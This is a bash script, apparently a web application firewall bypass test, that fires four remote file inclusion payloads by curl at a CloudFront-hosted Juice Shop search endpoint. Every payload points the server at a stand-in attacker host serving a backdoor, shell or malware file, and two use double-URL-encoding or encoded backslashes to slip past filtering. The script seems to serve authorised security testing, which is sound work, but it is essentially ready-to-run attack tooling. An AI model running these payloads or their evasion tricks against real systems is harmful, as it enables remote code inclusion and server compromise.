#!/bin/bash
# WAF Bypass Test — RFI (4 payloads)
# Run: bash curl_rfi.sh

ENDPOINT="https://dlpaasrngb6ue.cloudfront.net"

echo "[rfi] juiceshop-0170: https://evil.com/backdoor.php"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0170" \
  -H "X-Test-Category: rfi" \
  -d '{"content": "https://evil.com/backdoor.php"}'
echo ""

echo "[rfi] juiceshop-0171: %252f%252fmalicious.com%252fshell.txt"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0171" \
  -H "X-Test-Category: rfi" \
  -d '{"content": "%252f%252fmalicious.com%252fshell.txt"}'
echo ""

echo "[rfi] juiceshop-0172: %5c%5cattacker.com%5cbackdoor.txt"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0172" \
  -H "X-Test-Category: rfi" \
  -d '{"content": "%5c%5cattacker.com%5cbackdoor.txt"}'
echo ""

echo "[rfi] juiceshop-0173: https://attacker.site/malware.php"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0173" \
  -H "X-Test-Category: rfi" \
  -d '{"content": "https://attacker.site/malware.php"}'
echo ""
